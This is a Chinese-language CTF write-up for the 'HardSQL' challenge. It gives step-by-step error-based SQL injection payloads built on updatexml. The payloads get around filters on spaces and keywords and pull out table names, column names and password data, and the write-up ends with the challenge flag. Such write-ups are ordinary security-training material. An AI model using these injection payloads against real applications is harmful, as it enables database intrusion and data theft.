# [极客大挑战 2019]HardSQL 1

- 进入网页，尝试万能账号密码失败，尝试 `1'` 成功

> <img src="../../IMG2/Screenshot 2024-06-03 204358.png">

- 经测试，空格、union、select、orderby等关键字被屏蔽

> <img src="../../IMG2/Screenshot 2024-06-03 204542.png">

- 最终发现报错注入可用

`1'or(updatexml(1,concat(0x7e,database(),0x7e),1))#`

> <img src="../../IMG2/Screenshot 2024-06-03 205436.png">

- 爆数据表

`1'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))#`

> <img src="../../IMG2/Screenshot 2024-06-03 211707.png">

- 爆字段

`1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema)like(database())),0x7e),1))#`

> <img src="../../IMG2/Screenshot 2024-06-03 212426.png">

- 爆数据

`1'or(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)where(id)like(1)),0x7e),1))#`

> <img src="../../IMG2/Screenshot 2024-06-04 175747.png">

- 从上图中可以看出数据的长度被限制了，可以使用 `substr()` 或者 `right()` ，这道题 `substr()` 被过滤了，因此使用 `right()`

`1'or(updatexml(1,concat(0x7e,(select(right(group_concat(password),25))from(H4rDsq1)where(id)like(1)),0x7e),1))#`

> <img src="../../IMG2/Screenshot 2024-06-04 181926.png">

- 拼接得到flag

`flag{785d2a64-1b32-4ab2-8ca9-c28f7db63a1f}`